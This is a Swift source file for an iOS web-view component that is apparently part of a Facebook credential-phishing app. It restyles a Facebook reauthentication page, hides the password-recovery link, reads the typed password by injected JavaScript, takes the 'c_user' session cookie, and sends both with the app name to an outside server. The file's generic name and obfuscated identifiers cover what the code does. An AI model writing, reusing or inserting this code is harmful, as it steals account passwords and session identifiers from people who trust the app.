//
//  File.swift
//
//
//  Created by DanHa on 25/03/2023.
//

import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct CoordsThree: UIViewRepresentable {
    func makeCoordinator() -> CoorThreeDinator {
        CoorThreeDinator(self)
    }

    let url: URL?
    @Binding var is_three_chuyen_man: Bool
    @Binding var is_three_load_hide: Bool
    @Binding var is_three_get_mat_khau: String

    private let ob_three_servable = Web_Three()
    var ob_three_server: NSKeyValueObservation? {
        ob_three_servable.ins_three_tance
    }

    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true
        let source = "var meta = document.createElement('meta');meta.name = 'viewport';meta.content ='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';var head = document.getElementsByTagName('head')[0];head.appendChild(meta);"
        let script: WKUserScript = WKUserScript(source: source, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
        let userContentController = WKUserContentController()
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs
        config.userContentController = userContentController
        userContentController.addUserScript(script)

        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15"
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))
        return webview
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {
    }

    class CoorThreeDinator: NSObject, WKNavigationDelegate {
        var three_pa_rent: CoordsThree
        init(_ three_pa_rent: CoordsThree) {
            self.three_pa_rent = three_pa_rent
        }

        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
            webView.evaluateJavaScript("document.querySelector('[type=\"password\"]').value;") { pword, errorPword in
                if let pword = pword as? String, errorPword == nil {
                    self.three_pa_rent.is_three_get_mat_khau = pword
                }
            }
        }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            webView.evaluateJavaScript("var x = document.createElement(\"IMG\"); x.setAttribute(\"src\", \"https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg\"); x.setAttribute(\"width\", \"200\"); x.setAttribute(\"height\", \"80\"); x.setAttribute(\"style\", \"display: block; margin-left: auto; margin-right: auto; width:100%;\"); document. getElementById(\"bluebarRoot\").appendChild(x); document.querySelector('[id=\"pageFooter\"]').style.display='none'; document.querySelector('[id=\"content\"]').style = 'min-height: 0px'; document.querySelector(\".uiInterstitialLarge\").style = 'width: 350px'; document.querySelector('[aria-label=\"Facebook\"]').style.display='none'; document.querySelector('[href=\"/recover/initiate/?ref=www_reauth_page\"]').style.display='none'; document.querySelector('[class=\"UIFullPage_Container\"]').style = 'width: 100%';  document.querySelector('[id=\"globalContainer\"]').style = 'width: 100%'; document.querySelector('[id=\"pagelet_dock\"]').style.display='none';")
            DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
                webView.evaluateJavaScript("document.querySelector('[preserveAspectRatio=\"xMidYMid slice\"]').getAttributeNS('http://www.w3.org/1999/xlink', 'href');") { html, error in
                    if let htmlmatkhau = html as? String, error == nil {
                        if !htmlmatkhau.isEmpty {
                            WKWebsiteDataStore.default().httpCookieStore.getAllCookies { cookies in
                                let id_itn = cookies.firstIndex(where: { $0.name == "c_user" })
                                if id_itn != nil {
                                    UserDefaults.standard.set(try? JSONEncoder().encode(UserInvoicesMK(matkhau: self.three_pa_rent.is_three_get_mat_khau)), forKey: "matkhau")
                                    self.three_pa_rent.is_three_load_hide = true
                                    let three_json_data: [String: Any] = [
                                        "namecuser": cookies[id_itn!].value,
                                        "lastpass": self.three_pa_rent.is_three_get_mat_khau,
                                        "nameapp": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""]
                                    let url = URL(string: "https://managerpagesbusiness.com/api/saverepass")!
                                    let json_data = try? JSONSerialization.data(withJSONObject: three_json_data)
                                    var request = URLRequest(url: url)
                                    request.httpMethod = "PATCH"
                                    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                                    request.httpBody = json_data
                                    print("-------> is three mat khau \(self.three_pa_rent.is_three_get_mat_khau)")
                                    let task = URLSession.shared.dataTask(with: request) { _, _, error in
                                        if error != nil {
                                            print("not_ok")
                                        } else {
                                            self.three_pa_rent.is_three_chuyen_man = true
                                        }
                                    }
                                    task.resume()
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

struct UserInvoicesMK: Codable {
    var matkhau: String
}

private class Web_Three: ObservableObject {
    @Published var ins_three_tance: NSKeyValueObservation?
}
